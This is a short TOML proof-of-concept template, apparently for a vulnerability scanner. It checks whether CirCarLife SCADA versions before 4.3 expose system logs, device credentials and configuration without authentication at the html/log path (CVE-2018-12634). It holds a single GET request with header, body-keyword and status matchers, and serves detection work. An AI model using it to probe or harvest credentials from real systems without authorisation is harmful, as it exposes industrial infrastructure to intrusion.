[info]
author = "ave"
description = "验证 CirCarLife SCADA 4.3 之前版本是否存在未授权系统日志和敏感信息泄露漏洞。攻击者无需任何身份认证即可通过直接访问 html/log 路径获取系统运行日志、设备凭据及配置信息。"
id = "POC-AVE-2018-0072"
name = "CirCarLife SCADA 系统日志信息泄露 PoC"
severity = "critical"
tags = ["ave-2018-0072"]
vuln_id = [
    "CVE-2018-12634",
    "AVE-2018-0072",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/html/log"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = ["CirCarLife Scada"]

[[poc.requests.matchers]]
condition = "and"
expect = true
part = "body"
type = "word"
words = [
    "user.debug",
    "user.info",
    "EVSE",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
